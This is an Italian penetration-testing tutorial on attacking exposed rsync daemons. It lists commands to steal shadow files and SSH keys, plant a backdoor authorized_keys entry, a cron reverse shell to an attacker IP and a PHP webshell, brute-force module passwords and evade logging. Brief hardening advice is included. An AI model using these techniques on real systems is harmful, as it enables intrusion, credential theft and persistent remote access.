---
title: 'Porta 873 Rsync: moduli anonimi, backup esposti e file sensibili su Linux/Unix.'
slug: porta-873-rsync
description: 'Scopri cos’è la porta 873 rsync, come funzionano i moduli del demone rsyncd e perché configurazioni senza auth users o con permessi troppo permissivi possono esporre backup, configurazioni e dati sensibili.'
image: /porta-873-rsync.webp
draft: true
date: 2026-04-07T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - rsyncd
  - backup-exposure
---

> **Executive Summary** — La porta 873 espone il demone rsync, usato per sincronizzazione e backup di file su sistemi Linux/Unix. Rsync senza autenticazione è sorprendentemente comune: moduli esposti senza password permettono listing di directory, download di file sensibili (backup, config, shadow, SSH key) e, se writable, upload di file malevoli per ottenere accesso. Questa guida copre enumerazione moduli, accesso anonimo, file exfiltration, upload per persistenza e brute force delle password.

```id="w6h2qn"
TL;DR

- Rsync sulla porta 873 spesso espone moduli senza autenticazione — listing e download di qualsiasi file condiviso
- I moduli di backup contengono frequentemente `/etc/shadow`, chiavi SSH private, dump di database e config con credenziali
- Se il modulo è writable, puoi caricare una SSH key in `authorized_keys` o un crontab per reverse shell

```

Porta 873 rsync è il canale TCP del demone rsyncd, lo strumento standard per la sincronizzazione incrementale di file. La porta 873 vulnerabilità principale è l'accesso anonimo ai moduli: molti server espongono backup senza password. L'enumerazione porta 873 rivela moduli configurati, contenuto e permessi (lettura/scrittura). Nel rsync pentest, accedere a un modulo di backup significa ottenere `/etc/shadow`, chiavi SSH, config con credenziali e dump di database. Nella kill chain si posiziona come information disclosure e come initial access quando i moduli sono writable.

## 1. Anatomia Tecnica della Porta 873

La porta 873 è registrata IANA come `rsync`. Il demone rsyncd espone "moduli" — directory condivise con nome, path e permessi definiti in `/etc/rsyncd.conf`.

Il flusso rsync:

1. Client si connette alla 873
2. Server invia il banner (versione rsync)
3. Client richiede lista moduli o accesso diretto a un modulo
4. Se il modulo ha `auth users`: sfida password. Altrimenti: accesso immediato
5. Client può listare, scaricare o (se writable) caricare file

Esempio di `/etc/rsyncd.conf`:

```ini
[backup]
    path = /var/backup
    read only = yes
    # Nessun auth users = accesso anonimo

[private]
    path = /etc
    auth users = admin
    secrets file = /etc/rsyncd.secrets
    read only = yes
```

```
Misconfig: Modulo senza auth users
Impatto: chiunque può listare e scaricare tutti i file del modulo
Come si verifica: rsync rsync://[target]/modulo/ — se lista senza password, è anonimo
```

```
Misconfig: Modulo writable (read only = no) senza auth
Impatto: upload di SSH key, crontab, webshell per accesso remoto
Come si verifica: rsync test.txt rsync://[target]/modulo/ — se riesce = writable
```

```
Misconfig: Modulo che espone /etc/ o home directory
Impatto: accesso a shadow, passwd, SSH key, config con credenziali
Come si verifica: rsync rsync://[target]/modulo/etc/shadow — se scarica, è esposto
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 873 10.10.10.40
```

**Output atteso:**

```
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
| rsync-list-modules:
|   backup        	Daily system backup
|   www           	Web document root
|_  configs       	Configuration files
```

**Cosa ci dice questo output:** tre moduli esposti. `backup` è il target primario (backup di sistema = shadow, SSH key). `www` è il web root (potenziale webshell se writable). `configs` contiene configurazioni (credenziali).

### Comando 2: Lista moduli manuale

```bash
rsync rsync://10.10.10.40/
```

**Output atteso:**

```
backup        	Daily system backup
www           	Web document root
configs       	Configuration files
```

## 3. Enumerazione Avanzata

### Listing contenuto modulo

```bash
rsync -av --list-only rsync://10.10.10.40/backup/
```

**Output:**

```
drwxr-xr-x          4,096 2026/02/01 02:00:00 .
-rw-r--r--          1,234 2026/02/01 02:00:00 etc/passwd
-rw-------            890 2026/02/01 02:00:00 etc/shadow
-rw-------          3,247 2026/02/01 02:00:00 root/.ssh/id_rsa
-rw-r--r--     52,428,800 2026/02/01 02:00:00 var/backups/db_dump.sql
-rw-r--r--            456 2026/02/01 02:00:00 etc/rsyncd.secrets
```

**Lettura dell'output:** il modulo contiene una copia completa del sistema: `shadow` (hash password), chiave SSH privata di root, dump database e persino il file `rsyncd.secrets` con le password rsync. Finding critico — accesso completo senza autenticazione. Per il [cracking degli hash](https://hackita.it/articoli/bruteforce), scarica shadow e usa hashcat.

### Test permessi di scrittura

```bash
rsync -av --dry-run /tmp/test.txt rsync://10.10.10.40/www/
```

**Output (writable):**

```
sending incremental file list
test.txt
sent 100 bytes  received 35 bytes  270.00 bytes/sec
```

**Output (read-only):**

```
ERROR: module is read only
```

**Lettura dell'output:** modulo `www` writable — puoi caricare una [webshell](https://hackita.it/articoli/webshell).

### Listing ricorsivo con filtro

```bash
rsync -av --list-only rsync://10.10.10.40/backup/ | grep -iE "shadow|id_rsa|\.conf|\.sql|\.key|password"
```

**Output:**

```
-rw-------   890 etc/shadow
-rw-------  3247 root/.ssh/id_rsa
-rw-r--r--   456 etc/rsyncd.secrets
-rw-r--r-- 52MB  var/backups/db_dump.sql
```

## 4. Tecniche Offensive

**Download file sensibili**

Contesto: modulo `backup` anonimo. Scarica file critici.

```bash
rsync -av rsync://10.10.10.40/backup/etc/shadow /tmp/shadow
rsync -av rsync://10.10.10.40/backup/root/.ssh/id_rsa /tmp/root_key
rsync -av rsync://10.10.10.40/backup/etc/rsyncd.secrets /tmp/rsync_secrets
```

**Output (successo):**

```
receiving incremental file list
shadow
sent 43 bytes  received 890 bytes
```

**Cosa fai dopo:** hai shadow → cracka con `hashcat -m 1800 hashes rockyou.txt`. Hai la chiave SSH → `chmod 600 /tmp/root_key && ssh -i /tmp/root_key root@10.10.10.40`. Hai rsyncd.secrets → password per i moduli protetti.

**Upload SSH key per persistenza**

Contesto: modulo writable che mappa una home directory.

```bash
ssh-keygen -f /tmp/backdoor_key -N ""
rsync -av /tmp/backdoor_key.pub rsync://10.10.10.40/backup/root/.ssh/authorized_keys
```

**Output (successo):**

```
sending incremental file list
authorized_keys
```

**Cosa fai dopo:** `ssh -i /tmp/backdoor_key root@10.10.10.40`. Se il modulo corrisponde al filesystem reale (e non è un backup statico), hai accesso root persistente. Per le [tecniche di persistenza Linux](https://hackita.it/articoli/persistence), combina con crontab.

**Upload crontab per reverse shell**

Contesto: modulo writable con accesso a `/etc/cron.d/` o `/var/spool/cron/`.

```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/10.10.10.200/9001 0>&1'" > /tmp/evil_cron
rsync -av /tmp/evil_cron rsync://10.10.10.40/backup/etc/cron.d/persistence
```

**Cosa fai dopo:** listener: `nc -lvnp 9001`. Se il modulo è sincronizzato col filesystem, reverse shell ogni minuto.

**Upload webshell su web root**

Contesto: modulo `www` writable mappato sulla document root del web server.

```bash
echo '<?php system($_GET["c"]); ?>' > /tmp/cmd.php
rsync -av /tmp/cmd.php rsync://10.10.10.40/www/cmd.php
```

**Cosa fai dopo:** `curl "http://10.10.10.40/cmd.php?c=id"`. Se il web server elabora PHP, hai RCE.

**Brute force password modulo protetto**

Contesto: modulo con `auth users` — testi password comuni.

```bash
nmap -p 873 --script rsync-brute --script-args userdb=users.txt,passdb=passwords.txt 10.10.10.40
```

**Output:**

```
| rsync-brute:
|   Accounts:
|     backup:backup123 - Valid credentials
```

**Fallback manuale:**

```bash
for pass in "" "backup" "rsync" "password" "123456" "admin"; do
  RSYNC_PASSWORD="$pass" rsync rsync://backup@10.10.10.40/private/ 2>/dev/null && echo "FOUND: $pass" && break
done
```

## 5. Scenari Pratici di Pentest

### Scenario 1: Backup server con rsync anonimo

**Step 1:** `rsync rsync://10.10.10.40/` → lista moduli
**Step 2:** `rsync -av --list-only rsync://10.10.10.40/backup/` → contenuto
**Step 3:** Download shadow + SSH key → crack + accesso

**Se fallisce:** modulo richiede password → brute force o prova password comuni
**Tempo stimato:** 5-15 minuti

### Scenario 2: Web server con www writable

**Step 1:** `rsync -av --dry-run test.txt rsync://10.10.10.40/www/` → test write
**Step 2:** Upload webshell → `curl http://target/cmd.php?c=id`

**Se fallisce:** web server non processa PHP o modulo non mappa la docroot reale
**Tempo stimato:** 5-10 minuti

### Scenario 3: Rsync con auth debole

**Step 1:** `nmap -p 873 --script rsync-brute [target]`
**Step 2:** Con password trovata → listing e download

**Se fallisce:** password complessa → concentrati su moduli non protetti
**Tempo stimato:** 5-20 minuti

## 6. Attack Chain Completa

| Fase        | Tool    | Comando                                                         | Risultato      |
| ----------- | ------- | --------------------------------------------------------------- | -------------- |
| Recon       | nmap    | `nmap -sV -sC -p 873`                                           | Moduli esposti |
| Module List | rsync   | `rsync rsync://[target]/`                                       | Nomi moduli    |
| File List   | rsync   | `rsync -av --list-only rsync://[target]/[mod]/`                 | Contenuto      |
| Download    | rsync   | `rsync -av rsync://[target]/[mod]/etc/shadow /tmp/`             | File sensibili |
| Crack       | hashcat | `hashcat -m 1800 hashes wordlist`                               | Password       |
| Upload      | rsync   | `rsync -av key.pub rsync://[target]/[mod]/.ssh/authorized_keys` | Persistenza    |
| Access      | ssh     | `ssh -i key root@[target]`                                      | Shell root     |

## 7. Detection & Evasion

### Blue Team

* **Log rsync**: `/var/log/rsyncd.log` — connessioni, moduli, file trasferiti
* **IDS**: connessioni alla 873 da IP non autorizzati
* **File integrity**: modifiche in moduli writable (AIDE, Tripwire)

### Evasion

```
Tecnica: Download selettivo
Come: scarica solo shadow e SSH key — non l'intero modulo
Riduzione rumore: meno traffico, meno log, meno tempo di connessione
```

```
Tecnica: Singola connessione con filtri
Come: rsync -av --include='*.key' --include='shadow' --exclude='*'
Riduzione rumore: un solo log entry invece di molti
```

## 8. Toolchain e Confronto

| Aspetto     | Rsync (873)          | FTP (21)    | SCP (22)    | NFS (2049)   |
| ----------- | -------------------- | ----------- | ----------- | ------------ |
| Auth        | Per-modulo / anonimo | USER/PASS   | SSH         | Host-based   |
| TLS         | No (over SSH sì)     | FTPS        | Sì          | No           |
| Upload      | Se writable          | Se permesso | Se permesso | Se rw export |
| Brute force | nmap script          | hydra       | hydra       | N/A          |

## 9. Troubleshooting

| Errore                   | Causa              | Fix                                   |
| ------------------------ | ------------------ | ------------------------------------- |
| Connection refused       | rsyncd non attivo  | Porta custom? `nmap -sV -p- [target]` |
| `@ERROR: auth failed`    | Password richiesta | Brute force o password comuni         |
| `@ERROR: Unknown module` | Nome errato        | Lista: `rsync rsync://[target]/`      |
| Upload `read only`       | Modulo RO          | Prova altri moduli                    |
| Timeout                  | File grande        | `--timeout=60 --partial`              |

## 10. FAQ

**D: Come verificare se rsync è anonimo?**
R: `rsync rsync://[target]/` lista i moduli. Poi `rsync -av --list-only rsync://[target]/[modulo]/` — se funziona senza password, è anonimo.

**D: Rsync è cifrato?**
R: No. Rsync sulla 873 trasmette in chiaro. Per cifratura si usa rsync over SSH (`rsync -e ssh`).

**D: Come proteggere rsync?**
R: `auth users` e `secrets file` su ogni modulo. `hosts allow` per IP. `read only = yes`. Meglio: disabilita rsyncd e usa rsync over SSH.

## 11. Cheat Sheet Finale

| Azione         | Comando                                                  |
| -------------- | -------------------------------------------------------- |
| Scan           | `nmap -sV -sC -p 873 [target]`                           |
| Lista moduli   | `rsync rsync://[target]/`                                |
| Lista file     | `rsync -av --list-only rsync://[target]/[mod]/`          |
| Download file  | `rsync -av rsync://[target]/[mod]/path/file /tmp/`       |
| Download tutto | `rsync -av rsync://[target]/[mod]/ /tmp/dump/`           |
| Test write     | `rsync -av --dry-run test.txt rsync://[target]/[mod]/`   |
| Upload         | `rsync -av file rsync://[target]/[mod]/path/`            |
| Con password   | `RSYNC_PASSWORD=pass rsync rsync://user@[target]/[mod]/` |
| Brute force    | `nmap -p 873 --script rsync-brute [target]`              |

### Perché Porta 873 è rilevante nel 2026

Rsync è lo strumento di backup standard su Linux. Server con rsync anonimo espongono backup completi: shadow, SSH key, database, config. Un modulo writable è equivalente a una shell.

### Hardening

* `auth users` su ogni modulo
* `read only = yes` di default
* `hosts allow` per subnet
* Disabilita rsyncd → usa rsync over SSH
* Log centralizzati

### OPSEC

Download selettivo è meno visibile. Upload è la parte più rischiosa — file integrity monitoring lo rileva. Una connessione con filtri include/exclude è meno rumorosa di listing + download separati.

***

Riferimento: rsync protocol, rsyncd.conf(5). Uso esclusivo in ambienti autorizzati. Approfondimento: [https://www.speedguide.net/port.php?port=873](https://www.speedguide.net/port.php?port=873)

> [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
